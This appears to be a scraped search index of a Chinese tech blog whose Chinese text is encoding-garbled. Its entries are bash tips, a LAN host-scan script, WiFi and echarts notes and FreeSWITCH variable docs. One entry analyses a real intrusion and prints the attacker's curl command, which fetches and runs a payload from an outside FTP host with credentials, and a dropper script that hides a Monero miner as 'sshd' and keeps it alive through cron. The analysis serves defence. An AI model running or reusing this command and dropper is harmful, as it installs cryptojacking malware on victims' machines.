\u0026#39;%s\\n\u0026#39; \u0026#34;$date\u0026#34; Fri 15 Jun - 10:00 AM Get the username of the current user CAVEAT: Requires bash 4.4+\n$ : \\\\u # Expand the parameter as if it were a prompt string. $ printf \u0026#39;%s\\n\u0026#39; \u0026#34;${_@P}\u0026#34; black Generate a UUID V4 CAVEAT: The generated value is not cryptographically secure.\nExample Function:\nuuid() { # Usage: uuid C=\u0026#34;89ab\u0026#34; for ((N=0;N\u0026lt;16;++N)); do B=\u0026#34;$((RANDOM%256))\u0026#34; case \u0026#34;$N\u0026#34; in 6) printf \u0026#39;4%x\u0026#39; \u0026#34;$((B%16))\u0026#34; ;; 8) printf \u0026#39;%c%x\u0026#39; \u0026#34;${C:$RANDOM%${#C}:1}\u0026#34; \u0026#34;$((B%16))\u0026#34; ;; 3|5|7|9) printf \u0026#39;%02x-\u0026#39; \u0026#34;$B\u0026#34; ;; *) printf \u0026#39;%02x\u0026#39; \u0026#34;$B\u0026#34; ;; esac done printf \u0026#39;\\n\u0026#39; } Example Usage:\n$ uuid d5b6c731-1310-4c24-9fe3-55d556d44374 Progress bars This is a simple way of drawing progress bars without needing a for loopin the function itself.\nExample Function:\nbar() { # Usage: bar 1 10 # ^----- Elapsed Percentage (0-100). # ^-- Total length in chars. ((elapsed=$1*$2/100)) # Create the bar with spaces. printf -v prog \u0026#34;%${elapsed}s\u0026#34; printf -v total \u0026#34;%$(($2-elapsed))s\u0026#34; printf \u0026#39;%s\\r\u0026#39; \u0026#34;[${prog// /-}${total}]\u0026#34; } Example Usage:\nfor ((i=0;i\u0026lt;=100;i++)); do # Pure bash micro sleeps (for the example). (:;:) \u0026amp;\u0026amp; (:;:) \u0026amp;\u0026amp; (:;:) \u0026amp;\u0026amp; (:;:) \u0026amp;\u0026amp; (:;:) # Print the bar. bar \u0026#34;$i\u0026#34; \u0026#34;10\u0026#34; done printf \u0026#39;\\n\u0026#39; Get the list of functions in a script get_functions() { # Usage: get_functions IFS=$\u0026#39;\\n\u0026#39; read -d \u0026#34;\u0026#34; -ra functions \u0026lt; \u0026lt;(declare -F) printf \u0026#39;%s\\n\u0026#39; \u0026#34;${functions[@]//declare -f }\u0026#34; } Bypass shell aliases # alias ls # command # shellcheck disable=SC1001 \\ls Bypass shell functions # function ls # command command ls åå°è¿è¡Œå‘½ä»¤ This will run the given command and keep it running, even after the terminal or SSH connection is terminated. All output is ignored.\nbkr() { (nohup \u0026#34;$@\u0026#34; \u0026amp;\u0026gt;/dev/null \u0026amp;) } bkr ./some_script.sh # some_script.sh is now running in the background AFTERWORD Thanks for reading! If this bible helped you in any way and you\u0026rsquo;d like to give back, consider donating. Donations give me the time to make this the best resource possible. Can\u0026rsquo;t donate? That\u0026rsquo;s OK, star the repo and share it with your friends!\n","permalink":"https://wdd.js.org/shell/pure-bash-bible/","summary":"å­—ç¬¦ä¸² å­—ç¬¦ä¸²åŒ…å« Using a test:\nif [[ $var == *sub_string* ]]; then printf \u0026#39;%s\\n\u0026#39; \u0026#34;sub_string is in var.\u0026#34; fi # Inverse (substring not in string). if [[ $var != *sub_string* ]]; then printf \u0026#39;%s\\n\u0026#39; \u0026#34;sub_string is not in var.\u0026#34; fi # This works for arrays too! if [[ ${arr[*]} == *sub_string* ]]; then printf \u0026#39;%s\\n\u0026#39; \u0026#34;sub_string is in array.\u0026#34; fi Using a case statement:\ncase \u0026#34;$var\u0026#34; in *sub_string*) # Do stuff ;; *sub_string2*) # Do more stuff ;; *) # Else ;; esac å­—ç¬¦ä¸²å¼€å§‹ if [[ $var == sub_string* ]]; then printf \u0026#39;%s\\n\u0026#39; \u0026#34;var starts with sub_string.","title":"pure-bash-bible"},{"content":"ä½¿ç”¨ ping ä¼˜ç‚¹ åŸç”Ÿï¼Œä¸ç”¨å®‰è£…è½¯ä»¶ ç¼ºç‚¹ é€Ÿåº¦æ…¢ ä¸‹é¢çš„è„šæœ¬åˆ—å‡º 192.168.1.0/24 çš„æ‰€æœ‰ä¸»æœºï¼Œå¤§æ¦‚éœ€è¦ 255 ç§’\n#!/bin/bash function handler () { echo \u0026#34;will exit\u0026#34; exit 0 } trap \u0026#39;handler\u0026#39; SIGINT for ip in 192.168.1.{1..255} do ping -W 1 -c 1 $ip \u0026amp;\u0026gt; /dev/null if [ $? -eq 0 ]; then echo $ip is alive else echo $ip is dead fi done ä½¿ç”¨ fping ä¼˜ç‚¹ é€Ÿåº¦å¿« ç¼ºç‚¹ éœ€è¦å®‰è£… fping # å®‰è£…fping brew install fping # mac yum install fping # centos apt install fping # debian æˆ‘ç”¨çš„ fping æ˜¯ MacOS Xï¼Œ fping çš„ç‰ˆæœ¬æ˜¯ 4.2\nç”¨ fping å»æ‰§è¡Œï¼ŒåŒæ · 256 ä¸ªä¸»æœºï¼Œåªéœ€è¦ 5-6s\nfping -g 192.168.1.0/24 -r 1 -a -s ","permalink":"https://wdd.js.org/shell/list-active-host/","summary":"ä½¿ç”¨ ping ä¼˜ç‚¹ åŸç”Ÿï¼Œä¸ç”¨å®‰è£…è½¯ä»¶ ç¼ºç‚¹ é€Ÿåº¦æ…¢ ä¸‹é¢çš„è„šæœ¬åˆ—å‡º 192.168.1.0/24 çš„æ‰€æœ‰ä¸»æœºï¼Œå¤§æ¦‚éœ€è¦ 255 ç§’\n#!/bin/bash function handler () { echo \u0026#34;will exit\u0026#34; exit 0 } trap \u0026#39;handler\u0026#39; SIGINT for ip in 192.168.1.{1..255} do ping -W 1 -c 1 $ip \u0026amp;\u0026gt; /dev/null if [ $? -eq 0 ]; then echo $ip is alive else echo $ip is dead fi done ä½¿ç”¨ fping ä¼˜ç‚¹ é€Ÿåº¦å¿« ç¼ºç‚¹ éœ€è¦å®‰è£… fping # å®‰è£…fping brew install fping # mac yum install fping # centos apt install fping # debian æˆ‘ç”¨çš„ fping æ˜¯ MacOS Xï¼Œ fping çš„ç‰ˆæœ¬æ˜¯ 4.","title":"åˆ—å‡ºç½‘ç»œä¸­æ´»åŠ¨çš„ä¸»æœº"},{"content":"æœºå™¨è¢«å…¥ä¾µäº†ï¼Œå†™ç‚¹ä¸œè¥¿ï¼Œåˆ†æä¸€ä¸‹å…¥ä¾µè„šæœ¬ï¼Œé¡ºä¾¿ä¹Ÿå­¦ä¹ ä¸€ä¸‹ã€‚\nbash -c curl -O ftp://noji:noji2012@153.122.137.67/.kde/sshd.tgz;tar xvf sshd.tgz;rm -rf sshd.tgz;cd .ssd;chmod +x *;./go -r ä¸‹è½½æ¶æ„è½¯ä»¶ æ¶æ„è½¯ä»¶çš„æ˜¯ä½¿ç”¨ ftp ä¸‹è½½çš„ï¼Œ åœ°å€æ˜¯ï¼šftp://noji:noji2012@153.122.137.67/.kde/sshd.tgzï¼Œè¿™ä¸ª 153.122.137.67 IP æ˜¯ä½äºæ—¥æœ¬ä¸œäº¬ï¼Œssd.taz æ˜¯ä¸€ä¸ª tar åŒ…ï¼Œç”¨ tar è§£å‹ä¹‹åï¼Œå‡ºç°ä¸€ä¸ª sh æ–‡ä»¶ï¼Œä¸¤ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚\n-rwxr-xr-x 1 1001 1001 907 Nov 20 20:58 go # shell -rwxrwxr-x 1 1001 1001 1.3M Nov 20 21:06 i686 # å¯æ‰§è¡Œ -rwxrwxr-x 1 1001 1001 1.1M Nov 20 21:06 x86_64 # å¯æ‰§è¡Œ åˆ†æå¯æ‰§è¡Œæ–‡ä»¶ go go æ˜¯ä¸€ä¸ª shell ç¨‹åºï¼Œä¸‹æ–‡æ˜¯åˆ†æ\n#!/bin/bash # pool.supportxmr.comé—¨ç½—å¸çš„çŸ¿æ±  # æ‰€ä»¥å¤§å®¶åº”è¯¥æ¸…æ¥šäº†ï¼Œå…¥ä¾µçš„æœºå™¨åº”è¯¥ç”¨æ¥æŒ–çŸ¿çš„ # è¿™ä¸€æ­¥æ˜¯æµ‹è¯•æœ¬æœºä¸çŸ¿æ± dnsæ˜¯å¦é€š if [ $(ping -c 1 pool.supportxmr.com 2\u0026gt;/dev/null|grep \u0026#34;bytes of data\u0026#34; | wc -l ) -gt \u0026#39;0\u0026#39; ]; then dns=\u0026#34;\u0026#34; # dnsé€š else dns=\u0026#34;-d\u0026#34; # dnsä¸é€š fi # åˆ é™¤ç”¨æˆ·è®¡åˆ’ä»»åŠ¡ï¼Œå¹¶å°†æŠ¥é”™ä¿¡æ¯æ¸…é™¤ crontab -r 2\u0026gt;/dev/null # è¿™ä¸€æ­¥ä¸å¤ªæ‡‚ rm -rf /tmp/.lock 2\u0026gt;/dev/null # è®¾ç½®å½“å‰è¿›ç¨‹çš„åå­—ï¼Œä¸ºäº†æ©äººè€³ç›®ï¼Œèµ·ä¸ªsshd, é±¼ç›®æ··ç  EXEC=\u0026#34;sshd\u0026#34; # è·å–å½“å‰ç›®å½• DIR=`pwd` # è·å–å‚æ•°ä¸ªæ•° # è¿™ä¸ªç¨‹åºä¼ äº†ä¸€ä¸ª -r å‚æ•°ï¼Œæ‰€ä»¥$#çš„å€¼æ˜¯1 if [ \u0026#34;$#\u0026#34; == \u0026#34;0\u0026#34; ];\tthen ARGS=\u0026#34;\u0026#34; else # éå†æ¯ä¸€ä¸ªå‚æ•° for var in \u0026#34;$@\u0026#34; do if [ \u0026#34;$var\u0026#34; != \u0026#34;-f\u0026#34; ];\tthen ARGS=\u0026#34;$ARGS $var\u0026#34; # $varä¸æ˜¯-f, æ‰€ä»¥ARGSè¢«è¿™æ˜¯ä¸º-r fi if [ ! -z \u0026#34;$FAKEPROC\u0026#34; ];\tthen FAKEPROC=$((FAKEPROC+1)) # è¿™é‡Œä¸ä¼šæ‰§è¡Œï¼Œå› ä¸º$FAKEPROCæ˜¯ç©ºå­—ç¬¦ä¸² fi if [ \u0026#34;$var\u0026#34; == \u0026#34;-h\u0026#34; ];\tthen FAKEPROC=\u0026#34;1\u0026#34; # è¿™é‡Œä¹Ÿä¸ä¼šæ‰§è¡Œ fi if [[ \u0026#34;$FAKEPROC\u0026#34; == \u0026#34;2\u0026#34; ]];\tthen EXEC=\u0026#34;$var\u0026#34; # è¿™é‡Œä¹Ÿä¸ä¼šæ‰§è¡Œ fi if [ ! -z \u0026#34;$dns\u0026#34; ];\tthen ARGS=\u0026#34;$ARGS $dns\u0026#34; # å¦‚æœæœ¬æœºä¸çŸ¿æ± dnsé€šï¼Œåˆ™è¿™é‡Œä¸ä¼šæ‰§è¡Œ fi done fi # åˆ›å»ºç›®å½• mkdir -- \u0026#34;.$EXEC\u0026#34; #åˆ›å»º .sshdç›®å½• cp -f -- `uname -m` \u0026#34;.$EXEC\u0026#34;/\u0026#34;$EXEC\u0026#34; # uname -mè·å–ç³»ç»Ÿæ¶æ„ï¼Œç„¶ååˆ¤æ–­è¦æŠŠi686è¿˜æ˜¯x86_64æ‹·è´åˆ°.sshdç›®å½•, å¹¶é‡å‘½åä¸ºsshd ./\u0026#34;.$EXEC\u0026#34;/\u0026#34;$EXEC\u0026#34; $ARGS -f -c # æ‰§è¡Œæ”¹ååçš„æ–‡ä»¶ rm -rf \u0026#34;.$EXEC\u0026#34; # ç”Ÿæˆåç»­æ‰§è¡Œçš„è„šæœ¬ echo \u0026#34;#!/bin/bash cd -- $DIR mkdir -- .$EXEC cp -f -- `uname -m` .$EXEC/$EXEC ./.$EXEC/$EXEC $ARGS -c rm -rf .$EXEC\u0026#34; \u0026gt; \u0026#34;$EXEC\u0026#34; chmod +x -- \u0026#34;$EXEC\u0026#34; # æ‰§è¡Œè„šæœ¬ ./\u0026#34;$EXEC\u0026#34; # ç”Ÿæˆè®¡åˆ’ä»»åŠ¡æ‰§è¡Œè„šæœ¬ (echo \u0026#34;* * * * * `pwd`/$EXEC\u0026#34;) | sort - | uniq - | crontab - # åˆ é™¤goè„šæœ¬ rm -rf go ä¸Šæ–‡çš„è„šæœ¬ä¸­ï¼Œæœ‰è®¸å¤šå‘½ä»¤åè·Ÿç€ --Â å’Œ -Â è¿™ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯ bash è„šæœ¬çš„å†…ç½®å‚æ•°ï¼Œç”¨æ¥æ ‡è®°å‘½ä»¤çš„å†…ç½®å‚æ•°å·²ç»ç»“æŸã€‚\nç”±äº x86_64 å’Œ i686 æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå°±ä¸åˆ†æäº†ã€‚\næ¶æ„æ–‡ä»¶æ¸…é™¤ æ¸…é™¤ crontab å®šæ—¶ä»»åŠ¡ æ¸…é™¤å¯æ‰§è¡Œæ–‡ä»¶ã€‚å¯ä»¥ ll /proc/pid/exeÂ , çœ‹ä¸‹æ¶æ„è¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶ä½ç½® kill æ¶æ„ç¨‹åºçš„è¿›ç¨‹ ä¿®æ”¹ root å¯†ç  å¦‚ä½•é˜²æŠ¤ ä½¿ç”¨å¼ºå¯†ç ï¼Œè‡³å°‘ 32 ä½ ä½¿ç”¨ ssh key ç™»å½• æœ‰äº›è„šæœ¬ä¼šæŠŠåå­—ä¼ªè£…æˆç³»ç»ŸæœåŠ¡ï¼Œæ‰€ä»¥ä¸è¦è¢«è¿›ç¨‹çš„åå­—è¿·æƒ‘ï¼Œè€Œåº”è¯¥çœ‹çœ‹è¿™ä¸ªè¿›ç¨‹ä½¿ç”¨çš„èµ„æºæ˜¯å¦åˆç†ã€‚ä¸€ä¸ª sshd çš„è¿›ç¨‹ï¼Œæ­£å¸¸æ¥è¯´å ç”¨ cpu å’Œå†…å­˜ä¸ä¼šè¶…è¿‡ 1%ã€‚å¦‚æœä½ å‘ç°ä¸€ä¸ªå ç”¨ CPU%çš„ sshd è¿›ç¨‹ï¼Œä½ å°±è¦å°å¿ƒè¿™ä¸œè¥¿æ˜¯ä¸æ˜¯æ»¥ç«½å……æ•°äº†ã€‚ ","permalink":"https://wdd.js.org/shell/evil-script/","summary":"æœºå™¨è¢«å…¥ä¾µäº†ï¼Œå†™ç‚¹ä¸œè¥¿ï¼Œåˆ†æä¸€ä¸‹å…¥ä¾µè„šæœ¬ï¼Œé¡ºä¾¿ä¹Ÿå­¦ä¹ ä¸€ä¸‹ã€‚\nbash -c curl -O ftp://noji:noji2012@153.122.137.67/.kde/sshd.tgz;tar xvf sshd.tgz;rm -rf sshd.tgz;cd .ssd;chmod +x *;./go -r ä¸‹è½½æ¶æ„è½¯ä»¶ æ¶æ„è½¯ä»¶çš„æ˜¯ä½¿ç”¨ ftp ä¸‹è½½çš„ï¼Œ åœ°å€æ˜¯ï¼šftp://noji:noji2012@153.122.137.67/.kde/sshd.tgzï¼Œè¿™ä¸ª 153.122.137.67 IP æ˜¯ä½äºæ—¥æœ¬ä¸œäº¬ï¼Œssd.taz æ˜¯ä¸€ä¸ª tar åŒ…ï¼Œç”¨ tar è§£å‹ä¹‹åï¼Œå‡ºç°ä¸€ä¸ª sh æ–‡ä»¶ï¼Œä¸¤ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚\n-rwxr-xr-x 1 1001 1001 907 Nov 20 20:58 go # shell -rwxrwxr-x 1 1001 1001 1.3M Nov 20 21:06 i686 # å¯æ‰§è¡Œ -rwxrwxr-x 1 1001 1001 1.1M Nov 20 21:06 x86_64 # å¯æ‰§è¡Œ åˆ†æå¯æ‰§è¡Œæ–‡ä»¶ go go æ˜¯ä¸€ä¸ª shell ç¨‹åºï¼Œä¸‹æ–‡æ˜¯åˆ†æ\n#!/bin/bash # pool.","title":"å…¥ä¾µè„šæœ¬åˆ†æ - ç’å¤©è¿‡æµ·"},{"content":"","permalink":"https://wdd.js.org/posts/2019/12/drkxqu/","summary":"","title":"è¿›ç¨‹å®æˆ˜"},{"content":"","permalink":"https://wdd.js.org/posts/2019/12/caytlk/","summary":"","title":"docker slim"},{"content":"è·¯ç”±å™¨æ— çº¿ç½‘ç»œçš„æ¨¡å¼æœ‰11b only ,11g only, 11n only,11bg mixed,11bgn mixed\n11bï¼šå°±æ˜¯11MÂ 11gï¼šå°±æ˜¯54MÂ 11nï¼šå°±æ˜¯150Mæˆ–è€…300MÂ onlyï¼šåœ¨æ­¤æ¨¡å¼ä¸‹ï¼Œé¢‘é“ä»…ä½¿ç”¨ 802.11bæ ‡å‡†mixedï¼šæ”¯æŒæ··åˆ 802.11b å’Œ 802.11g è£…ç½®\nä¿®æ”¹è·¯ç”±å™¨å·¥ä½œæ¨¡å¼åï¼Œæ‰‹æœºè¿æ¥wifiï¼Œç„¶åç”¨è…¾è®¯æ‰‹æœºç®¡å®¶å¯¹WiFiæµ‹é€Ÿ\nå·¥ä½œæ¨¡å¼ ä¸‹è½½é€Ÿåº¦ 11b 200kb/s 11g 400kb/s 11n 1.1MB/s 11bgn mixed 2.06MB/s æ‰€ä»¥ï¼Œé€‰æ‹©11bgnæ˜¯ä¸ªä¸é”™çš„é€‰æ‹©ã€‚\n","permalink":"https://wdd.js.org/posts/2019/12/mgyw98/","summary":"è·¯ç”±å™¨æ— çº¿ç½‘ç»œçš„æ¨¡å¼æœ‰11b only ,11g only, 11n only,11bg mixed,11bgn mixed\n11bï¼šå°±æ˜¯11MÂ 11gï¼šå°±æ˜¯54MÂ 11nï¼šå°±æ˜¯150Mæˆ–è€…300MÂ onlyï¼šåœ¨æ­¤æ¨¡å¼ä¸‹ï¼Œé¢‘é“ä»…ä½¿ç”¨ 802.11bæ ‡å‡†mixedï¼šæ”¯æŒæ··åˆ 802.11b å’Œ 802.11g è£…ç½®\nä¿®æ”¹è·¯ç”±å™¨å·¥ä½œæ¨¡å¼åï¼Œæ‰‹æœºè¿æ¥wifiï¼Œç„¶åç”¨è…¾è®¯æ‰‹æœºç®¡å®¶å¯¹WiFiæµ‹é€Ÿ\nå·¥ä½œæ¨¡å¼ ä¸‹è½½é€Ÿåº¦ 11b 200kb/s 11g 400kb/s 11n 1.1MB/s 11bgn mixed 2.06MB/s æ‰€ä»¥ï¼Œé€‰æ‹©11bgnæ˜¯ä¸ªä¸é”™çš„é€‰æ‹©ã€‚","title":"wifiå·¥ä½œæ¨¡å¼æµ‹è¯•"},{"content":"var data = [] var t1 = [ [\u0026#34;2019-12-11T09:13:06.078545239Z\u0026#34;,153], [\u0026#34;2019-12-11T09:14:06.087484224Z\u0026#34;,118], [\u0026#34;2019-12-11T09:15:07.723571286Z\u0026#34;,198], [\u0026#34;2019-12-11T09:16:09.534879791Z\u0026#34;,249], ] var t2 = [ [\u0026#34;2019-12-11T09:13:06Z\u0026#34;,153], [\u0026#34;2019-12-11T09:14:06Z\u0026#34;,118], [\u0026#34;2019-12-11T09:15:07Z\u0026#34;,198], [\u0026#34;2019-12-11T09:16:09Z\u0026#34;,249], ] var data = t1.map(function(item){ return { value: [item[0], item[1]] } }) option = { title: { text: \u0026#39;åŠ¨æ€æ•°æ® + æ—¶é—´åæ ‡è½´\u0026#39; }, tooltip: { trigger: \u0026#39;axis\u0026#39; }, xAxis: { type: \u0026#39;time\u0026#39; }, yAxis: { type: \u0026#39;value\u0026#39; }, series: [{ name: \u0026#39;æ¨¡æ‹Ÿæ•°æ®\u0026#39;, type: \u0026#39;line\u0026#39;, showSymbol: false, hoverAnimation: false, data: data }] }; æ•°æ®é›†t1æ—¶é—´ç²¾åº¦åˆ°ç§’ï¼Œå¹¶ä¸”å¸¦9ä½å°æ•° æ•°æ®é›†t2æ—¶é—´ç²¾ç¡®åˆ°ç§’ï¼Œä¸å¸¦å°æ•° t1çš„ç»˜çº¿å‡ºç°å¾€å›æ‹ï¼Œæ˜æ˜¾æœ‰é—®é¢˜ã€‚ä¸çŸ¥é“è¿™æ˜¯ä¸æ˜¯echarsçš„bug\nè§£å†³æ–¹æ¡ˆï¼ŒæŸ¥è¯¢æ˜¯è®¾ç½®epoch=s, ç”¨unixç§’æ•°æ¥æ ¼å¼åŒ–äº‹ä»¶\n","permalink":"https://wdd.js.org/posts/2019/12/nolg61/","summary":"var data = [] var t1 = [ [\u0026#34;2019-12-11T09:13:06.078545239Z\u0026#34;,153], [\u0026#34;2019-12-11T09:14:06.087484224Z\u0026#34;,118], [\u0026#34;2019-12-11T09:15:07.723571286Z\u0026#34;,198], [\u0026#34;2019-12-11T09:16:09.534879791Z\u0026#34;,249], ] var t2 = [ [\u0026#34;2019-12-11T09:13:06Z\u0026#34;,153], [\u0026#34;2019-12-11T09:14:06Z\u0026#34;,118], [\u0026#34;2019-12-11T09:15:07Z\u0026#34;,198], [\u0026#34;2019-12-11T09:16:09Z\u0026#34;,249], ] var data = t1.map(function(item){ return { value: [item[0], item[1]] } }) option = { title: { text: \u0026#39;åŠ¨æ€æ•°æ® + æ—¶é—´åæ ‡è½´\u0026#39; }, tooltip: { trigger: \u0026#39;axis\u0026#39; }, xAxis: { type: \u0026#39;time\u0026#39; }, yAxis: { type: \u0026#39;value\u0026#39; }, series: [{ name: \u0026#39;æ¨¡æ‹Ÿæ•°æ®\u0026#39;, type: \u0026#39;line\u0026#39;, showSymbol: false, hoverAnimation: false, data: data }] }; æ•°æ®é›†t1æ—¶é—´ç²¾åº¦åˆ°ç§’ï¼Œå¹¶ä¸”å¸¦9ä½å°æ•° æ•°æ®é›†t2æ—¶é—´ç²¾ç¡®åˆ°ç§’ï¼Œä¸å¸¦å°æ•° t1çš„ç»˜çº¿å‡ºç°å¾€å›æ‹ï¼Œæ˜æ˜¾æœ‰é—®é¢˜ã€‚ä¸çŸ¥é“è¿™æ˜¯ä¸æ˜¯echarsçš„bug","title":"influxdbæ—¶é—´ç²¾åº¦åˆ°ç§’"},{"content":"\nAbout Channel variables are used to manipulate dialplan execution, to control call progress, and to provide options to applications. They play a pervasive role, as FreeSWITCHâ„¢Â frequently consults channel variables as a way to customize processing prior to a channel\u0026rsquo;s creation, during call progress, and after the channel hangs up.Â ï„œ Click here to expand Table of Contents Variable Expansion We rely on variable expansion to create flexible, reusable dialplans:\n$${variable}Â is expanded once when FreeSWITCHâ„¢Â first parses the configuration on startup or after invokingÂ reloadxml. It is suitable for variables that do not change, such as the domain of a single-tenant FreeSWITCHâ„¢Â server. That is whyÂ $${domain}Â is referenced so frequently in the vanilla dialplan examples.Â ${variable}Â is expanded during each pass through the dialplan, so it is used for variables that are expected to change, such as theÂ ${destination_number}Â orÂ ${sip_to_user}Â fields. Channel Variables in the XML Dialplan Channel variables are set, appropriately enough, with theÂ set application:\n\u0026lt;action application=\u0026ldquo;set\u0026rdquo; data=\u0026ldquo;var_name=var value\u0026rdquo;/\u0026gt; Reading channel variables requires the ${} syntax:\n\u0026lt;action application=\u0026ldquo;log\u0026rdquo; data=\u0026ldquo;INFO The value in the var_name chan var is ${var_name}\u0026rdquo;/\u0026gt;\u0026lt;condition field=\u0026quot;${var_name}\u0026quot; expression=\u0026ldquo;some text\u0026rdquo;\u0026gt; Scoped Variables Channel variables used to be global to the session. As of b2c3199f, it is possible to set variables that only exist within a single application execution and any subsequent applications under it. For example, applications can use scoped variables for named input params:\n\u0026lt;action application=\u0026ldquo;log\u0026rdquo; data=\u0026ldquo;INFO myvar is \u0026lsquo;${myvar}\u0026rsquo;\u0026rdquo;/\u0026gt;\u0026lt;action application=\u0026ldquo;log\u0026rdquo; data=\u0026quot;%[myvar=Hello]INFO myvar is \u0026lsquo;${myvar}\u0026rsquo;\u0026quot;/\u0026gt;\u0026lt;action application=\u0026ldquo;log\u0026rdquo; data=\u0026ldquo;INFO myvar is \u0026lsquo;${myvar}\u0026rsquo;\u0026rdquo;/\u0026gt;\u0026lt;action application=\u0026ldquo;myapp\u0026rdquo; data=\u0026quot;%[var1=val1,var2=val2]mydata\u0026quot;/\u0026gt; Channel Variables in Dial Strings The variable assignment syntax for dial strings differs depending on which scope they should apply to:\n{foo=bar} is only valid at the beginning of the dial string. It will set the same variables on every channel, but does not do so for enterprise bridging/originate. \u0026lt;foo=bar\u0026gt; is only valid at the beginning of a dial string. It will set the same variables on every channel, including all thos in an enterprise bridging/originate. [foo=bar] goes before each individual dial string and will set the variable values specified for only this channel. ExamplesSet foo variable for all channels implemented andÂ chan=1Â will only be set forÂ blah, while chan=2Â will only be set forÂ blah2:\n{foo=bar}[chan=1]sofia/default/blah@baz.com,[chan=2]sofia/default/blah2@baz.com Set multiple variables by delimiting with commas:\n[var1=abc,var2=def,var3=ghi]sofia/default/blah@baz.com To have variables inÂ [] override variables inÂ {}, set local_var_clobber=true insideÂ {}. You must also set local_var_clobber=true when you want to override channel variables that have been exported to your b-legs in your dialplan. In this example, the legs for blah1@baz.com and johndoe@example.com would be set to offer SRTP (RTP/SAVP) while janedoe@acme.com would not receive an SRTP offer (she would see RTP/AVP instead):\n{local_var_clobber=true,rtp_secure_media=true}sofia/default/blah1@baz.com|sofia/default/johndoe@example.com|rtp_secure_media=false]sofia/default/janedoe@acme.comÂ Escaping/Redefining Delimiters Commas are the default delimiter inside variable assignment tags. In some cases (like in absolute_codec_string), we may need to define variables whose values contain literal commas that should not be interpreted as delimiters.Â We can redefine the delimiter for a variable using ^^ followed by the desired delimiter:\n^^;one,two,three;four,five,six;seven,eight,nine To set absolute_codec_string=PCMA@8000h@20i@64000b,PCMU@8000h@20i@64000b,G729@8000h@20i@8000b in a dial string:\n{absolute_codec_string=^^:PCMA@8000h@20i@64000b:PCMU@8000h@20i@64000b:G729@8000h@20i@8000b,leg_time_out=10,process_cdr=b_only} This approach does not work when setting sip_h_, sip_rh_, and sip_ph headers. To pass a comma into the contents of a private header, escape the comma with a backslash:\n{sip_h_X-My-Header=one\\,two\\,three,leg_time_out=10,process_cdr=b_only} Exporting Channel Variables in Bridge Operations Variables from one call leg (A) can be exported to the other call leg (B) by using the export_vars variable. Its value is a comma separated list of variables that should propagate across calls.\n\u0026lt;action application=\u0026ldquo;set\u0026rdquo; data=\u0026ldquo;export_vars=myvar,myvar2,foo,bar\u0026rdquo;/\u0026gt; To set a variable on the A-leg and add it to the export list, use the export application:\n\u0026lt;action application=\u0026ldquo;export\u0026rdquo; data=\u0026ldquo;myvar=true\u0026rdquo;/\u0026gt; Using Channel Variables in Dialplan Condition Statements Channel variables can be used in conditions, refer toÂ XML Dialplan ConditionsÂ for more information. Some channel variables may not be set during the dialplan parsing phrase. See Inline Actions. Custom Channel Variables We are not constrained to the channel variables that FreeSWITCHâ„¢, its modules, and applications define. It is possible to set any number of unique channel variables for any purpose. They can also be logged in CDR.Â The set application can be used to set any channel variable:\n\u0026lt;action application=\u0026ldquo;set\u0026rdquo; data=\u0026ldquo;lead_id=2e4b5966-0aaf-11e8-ba89-0ed5f89f718b\u0026rdquo;/\u0026gt;\u0026lt;action application=\u0026ldquo;set\u0026rdquo; data=\u0026ldquo;campaign_id=333814\u0026rdquo;/\u0026gt;\u0026lt;action application=\u0026ldquo;set\u0026rdquo; data=\u0026ldquo;crm_tags=referral new loyal\u0026rdquo; /\u0026gt; In a command issued viaÂ mod_xml_rpcÂ orÂ mod_event_socket:\noriginate {lead_id=2e4b5966-0aaf-11e8-ba89-0ed5f89f718,campaign_id=333814}sofia/mydomain.com/18005551212@1.2.3.4 15555551212 Values with spaces must be enclosed by quotes:\noriginate {crm_tags=\u0026lsquo;referral new loyal'}sofia/mydomain.com/18005551212@1.2.3.4 15555551212 Channel Variable Manipulation Channel variables can be manipulated for varied results. For example, a channel variable could be trimmed to get the first three digits of a phone number.Â Manipulating Channel Variables discusses this in detail. Channel Variable Scope Example Consider this example:\n\u0026lt;extension name=\u0026ldquo;test\u0026rdquo; continue=\u0026ldquo;false\u0026rdquo;\u0026gt;Â \u0026lt;condition field=\u0026ldquo;destination_number\u0026rdquo; expression=\u0026quot;^test([0-9]+)$\u0026quot;\u0026gt;Â \u0026lt;action application=\u0026ldquo;set\u0026rdquo; data=\u0026ldquo;fruit=tomato\u0026rdquo; /\u0026gt; \u0026lt;action application=\u0026ldquo;export\u0026rdquo; data=\u0026ldquo;veggie=tomato\u0026rdquo; /\u0026gt; \u0026lt;action application=\u0026ldquo;bridge\u0026rdquo; data=\u0026quot;{meat=tomato}sofia/gateway/testaccount/1234\u0026quot; /\u0026gt;Â \u0026lt;/condition\u0026gt;\u0026lt;/extension\u0026gt; Leg A (the channel that called the dial plan) will have these variables set:\nfruit: tomatoveggie: tomato Leg B (the channel created with sofia/gateway/testaccount/1234) will have these variables set:\nfruit: tomatomeat: tomato Accessing Channel Variables in Other Environments In addition to the dialplan, channel variables can be set in other environments as well.In aÂ FreeSWITCHâ„¢Â module, written in C:\nswitch_channel_set_variable(channel,\u0026ldquo;name\u0026rdquo;,\u0026ldquo;value\u0026rdquo;);char* result = switch_channel_get_variable(channel,\u0026ldquo;name\u0026rdquo;);Â char* result = switch_channel_get_variable_partner(channel,\u0026ldquo;name\u0026rdquo;); In the console (or fs_cli, implemented in mod_commands):Â uuid_getvar uuid_setvar []uuid_setvar_multi =[;=[;\u0026hellip;]]Â Alternatively, callÂ uuid_dumpÂ to getÂ allÂ the variables, or use theÂ evalÂ command, adding the prefixÂ variable_Â to the key:\nuuid_dump eval uuid: ${variable_} In an event socket, just extend the above with the apiÂ prefix:\napi uuid_getvar In Lua, there are several ways to interact with variables. In theÂ freeswitch.Session()Â invocation that creates a newÂ Session object, variables go in square brackets:\ns = freeswitch.Session(\u0026quot;[myname=myvars]sofia/localhost/1003\u0026quot;) With the new Session object s:\nlocal result1 = s:getVariable(\u0026ldquo;myname\u0026rdquo;) \u0026ndash; \u0026ldquo;myvars\u0026rdquo;s:setVariable(\u0026ldquo;name\u0026rdquo;, \u0026ldquo;value\u0026rdquo;)local result2 = s:getVariable(\u0026ldquo;name\u0026rdquo;) \u0026ndash; \u0026ldquo;value\u0026rdquo; Info Application Variable Names (variable_xxxx) Some variables, as shown from the info app, may have variable_ in front of their names. For example, if you pass a header variable called type from the proxy server, it will get displayed as 